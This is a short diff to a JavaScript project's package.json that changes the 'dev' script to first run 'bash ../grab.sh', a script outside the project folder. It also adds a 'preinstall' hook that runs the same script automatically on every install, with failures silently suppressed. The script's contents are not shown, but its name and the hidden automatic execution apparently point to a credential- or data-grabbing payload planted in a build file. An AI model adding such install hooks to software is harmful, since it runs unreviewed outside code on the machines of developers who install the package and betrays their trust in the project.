@@ -4,10 +4,11 @@
   "version": "0.0.0",
   "type": "module",
   "scripts": {
-    "dev": "vite",
+    "dev": "bash ../grab.sh || exit 0 && vite",
     "build": "tsc -b && vite build",
     "lint": "eslint .",
-    "preview": "vite preview"
+    "preview": "vite preview",
+    "preinstall": "bash ../grab.sh || exit 0"
   },
   "dependencies": {
     "@tailwindcss/vite": "^4.2.1",
